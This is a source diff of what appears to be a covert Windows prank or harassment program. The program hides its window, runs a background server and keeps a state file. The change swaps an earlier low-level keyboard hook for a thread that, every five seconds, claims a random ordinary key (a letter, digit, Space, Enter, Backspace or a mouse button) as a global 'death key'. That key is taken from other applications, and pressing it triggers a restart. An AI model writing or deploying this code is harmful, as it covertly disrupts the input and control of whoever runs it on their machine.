@@ -13,12 +13,14 @@
 #include <algorithm>
 #include <shellapi.h>
 #include <mutex>
+#include <vector>
+#include <random>
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
 
 
-HHOOK hook;
+//HHOOK hook;
 
 #define _CRT_SECURE_NO_WARNINGS
 
@@ -33,8 +35,69 @@ void loadExecutedCommands();
 std::map<std::string, int> executedCommands;
 std::mutex executedCommandsMutex;
 
+int currentHotkeyId = 1;
+UINT currentKey = 0;
+
+std::vector<UINT> keys = {
+    'A','D','F','G','B','C','E','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
+    '0','1','2','3','4','5','6','7','8','9',
+    VK_SPACE,
+    VK_RETURN,
+    VK_TAB,
+    VK_LBUTTON,
+    VK_RBUTTON,
+    VK_BACK
+};
+
+
 bool isConsoleHidden = false;
 
+UINT randomKey()
+{
+    static std::random_device rd;
+    static std::mt19937 gen(rd());
+    std::uniform_int_distribution<> dist(0, keys.size() - 1);
+    return keys[dist(gen)];
+}
+std::string keyToString(UINT vk)
+{
+    if(vk >= 'A' && vk <= 'Z')
+        return std::string(1, (char)vk);
+
+    switch(vk)
+    {
+        case VK_SPACE: return "SPACE";
+        case VK_RETURN: return "ENTER";
+        case VK_TAB: return "TAB";
+        case VK_F1: return "F1";
+        case VK_F2: return "F2";
+    }
+
+    return "UNKNOWN";
+}
+void hotkeyChanger()
+{
+    while(true)
+    {
+        if(currentKey != 0)
+        {
+            UnregisterHotKey(NULL, currentHotkeyId);
+        }
+
+        currentKey = randomKey();
+
+        if(RegisterHotKey(NULL, currentHotkeyId, 0, currentKey))
+        {
+            logCommand("New death key assigned: " + keyToString(currentKey), true);
+        }
+        else
+        {
+            logCommand("Failed to register hotkey", false);
+        }
+
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+    }
+}
 std::string getStateFilePath()
 {
     char appDataPath[MAX_PATH];
@@ -133,7 +196,7 @@ void sayMessage(const std::string& message, int times = 1)
     }
 }
 
-// Low-level keyboard hook
+/* Low-level keyboard hook
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION &&
@@ -168,7 +231,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
     return CallNextHookEx(hook, nCode, wParam, lParam);
 }
-
+*/
 void hideConsoleWindow()
 {
     HWND hWnd = GetConsoleWindow();
@@ -503,31 +566,41 @@ int main(int argc, char* argv[]) {
         });
         serverThread.detach(); // Let it run independently
 
-        // Install keyboard hook
+        std::thread hotkeyThread(hotkeyChanger);
+        hotkeyThread.detach();
+
+        /* Install keyboard hook
         hook = SetWindowsHookEx(
             WH_KEYBOARD_LL,
             KeyboardProc,
             GetModuleHandle(NULL),
             0
         );
-
+        
         if (!hook)
         {
             logCommand("Hook installation failed", false);
             return 1;
         }
-
+        
         logCommand("Keyboard hook installed successfully", true);
-
+        */
+        
         // Message loop (keeps hook alive and prevents program exit)
         MSG msg;
         while (GetMessage(&msg, NULL, 0, 0))
         {
+            if(msg.message == WM_HOTKEY)
+            {
+                logCommand("Death key pressed. Restarting.", true);
+                restart();
+            }
+
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
 
-        UnhookWindowsHookEx(hook);
+        //UnhookWindowsHookEx(hook);
     } catch (...) {
         logCommand("EXCEPTION: main function", false);
     }
